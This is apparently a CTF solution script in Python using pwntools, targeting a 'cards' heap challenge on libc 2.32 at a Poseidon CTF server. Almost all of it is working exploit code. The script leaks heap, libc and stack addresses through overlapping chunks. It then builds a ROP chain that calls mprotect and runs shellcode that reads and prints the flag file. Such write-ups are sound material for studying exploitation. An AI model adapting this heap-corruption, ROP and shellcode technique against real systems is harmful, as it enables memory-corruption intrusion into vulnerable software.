#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./cards"
LIBCNAME = "./libc-2.32.so"

hosts = ("poseidonchalls.westeurope.cloudapp.azure.com","localhost","localhost")
ports = (9004,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge(idx):
    c.recvuntil("Choice: ")
    c.sendline(str(idx))

def _add(size, color, name):
    if len(color) > 7:
        raw_input("[-] color size too long: "+hex(len(color)))
        exit()
    hoge(1)
    c.recvuntil("card: ")
    c.send(str(size))
    c.recvuntil("color: ")
    c.send(color)
    c.recvuntil("name: ")
    c.send(name)

def _remove(idx):
    hoge(2)
    c.recvuntil("card: ")
    c.sendline(str(idx))

def _edit(idx, name):
    hoge(3)
    c.recvuntil("card: ")
    c.send(str(idx))
    c.recvuntil("name: ")
    c.send(name)

def _view(idx):
    hoge(4)
    c.recvuntil("card: ")
    c.sendline(str(idx))

# 謎の隠しコマンド
def _secret(name):
    hoge(6)
    c.recvuntil("name: ")
    c.send(name)

# house of io ?
def decrypt(Pd):
    L = Pd >> 36
    for i in range(3):
      temp = (Pd >> (36-(i+1)*8)) & 0xff
      element = ((L>>4) ^ temp) & 0xff
      L = (L<<8) + element
      print("L : "+hex(L))

## exploit ###########################################

def exploit():
  global c
  flag_path = "/home/challenge/flag\x00"

  shellcode = b""
  shellcode += asm("mov rdi, 0x0000000067616c66") # /home/challenge/flag
  shellcode += asm("push rdi")
  shellcode += asm("mov rdi, 0x2f65676e656c6c61")
  shellcode += asm("push rdi")
  shellcode += asm("mov rdi, 0x68632f656d6f682f")
  shellcode += asm("push rdi")

  shellcode += asm("mov rdi, rsp")
  shellcode += asm("mov rax, 2")
  shellcode += asm("mov rdx, 0")
  shellcode += asm("mov rsi, 0")
  shellcode += asm("syscall")

  shellcode += asm("mov rdi, rax")
  shellcode += asm("mov rcx, rsp") # バッファ
  shellcode += asm("mov rsi, rcx")
  shellcode += asm("mov rdx, 0x80")
  shellcode += asm("mov rax, 0")
  shellcode += asm("syscall")

  shellcode += asm("mov rdi, 1")
  shellcode += asm("mov rsi, rsp")
  shellcode += asm("mov rdx, 0x80")
  shellcode += asm("mov rax, 1")
  shellcode += asm("syscall")


  print("shellcode len: "+hex(len(shellcode)))
  
  _add(0x20, "red", "A"*0x10) # 0x20である必要(struct noteと同じ)
  _remove(0)

  # leak heapbase
  _add(0x20, "A", "A"*0x10)
  _view(1)
  c.recvuntil("A"*0x10)
  leaked01 = unpack(c.recvuntil(".")[:-1].ljust(8,'\x00'))
  print("[+] leaked: "+hex(leaked01))
  heapbase = leaked01 - 0x40
  print("[+] heapbase: "+hex(heapbase))

  # overwrite 0's flag
  _edit(1, p64(0xdeadbeefcafebabe)*3 + p64(1))

  _add(0xf8, "B"*0x4, flag_path) # 2
  _add(0xf8, "D"*0x4, "/bin/sh\x00") # 3
  _add(0xf8, "F"*0x4, flag_path) # 4
  _add(0xf8, "H"*0x4, p64(0x31)*(0xf8/8)) # 5 こいつがつじつま合わせに必要 0x450のfake chunkのnext
  _add(0xf8, "J"*0x4, shellcode) # 6

  _edit(1, p64(heapbase + 0xf0 + 8) + p64(0xdeadbeefcafebabe) + p64(heapbase)) # これでnote->target==heapbaseとなり、note->target->name==目標のchunkになる
  _edit(0, p64(0x451))       # fake size of name of 2(maybe)

  _remove(2) # fake size == 0x451 unsorted生成


  # libcbase leak
  _add(0x60, "X", "Y") #7
  _view(7)
  c.recvuntil("Y")
  leaked02 = (unpack(c.recvuntil(".")[:-1].ljust(8,'\x00'))) * 0x100 - 0x400
  print("[+] leaked: "+hex(leaked02))
  libcbase = leaked02 - 0x3b6c00
  print("[+] libcbase: "+hex(libcbase))
  free_hook = libcbase + 0x3b8e80
  system = libcbase + 0x43930
  print("[+] free_hook: "+hex(free_hook))


  # note4のname_ptrをenvironへ: stack leak
  _edit(1, p64(heapbase + 0x3a0) + p64(0xdeadbeefcafebabe) + p64(heapbase)) 
  _edit(0,p64(libcbase + libc.symbols["environ"]))
  _view(4)
  c.recvuntil("name: ")
  environ = unpack(c.recvuntil(".")[:-1].ljust(8,'\x00'))
  print("[+] environ: "+hex(environ))
  stack_ra = environ - 0x100
  print("[+] RA addr of main stack: "+hex(stack_ra))


  # EDITのstackのRA書き換え
  _edit(1, p64(heapbase + 0x680 - 0x20) + p64(0xdeadbeefcafebabe) + p64(heapbase)) 
  _edit(0, p64(stack_ra - 0x78 + 8))

  pop_rdi = 0x0002201c
  pop_rsi = 0x0002c626
  pop_rdx = 0x00001b9e
  shell_mem = heapbase + 0x680 # note6
  protected_mem = heapbase & 0xfffffffffffff000

  rop = b""
  rop += p64(libcbase + pop_rdi)
  rop += p64(protected_mem)
  rop += p64(libcbase + pop_rsi)
  rop += p64(0x3000)
  rop += p64(libcbase + pop_rdx)
  rop += p64(0x7)
  rop += p64(libcbase + libc.symbols["mprotect"])
  rop += p64(shell_mem)

  _edit(6, rop)
  return



## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
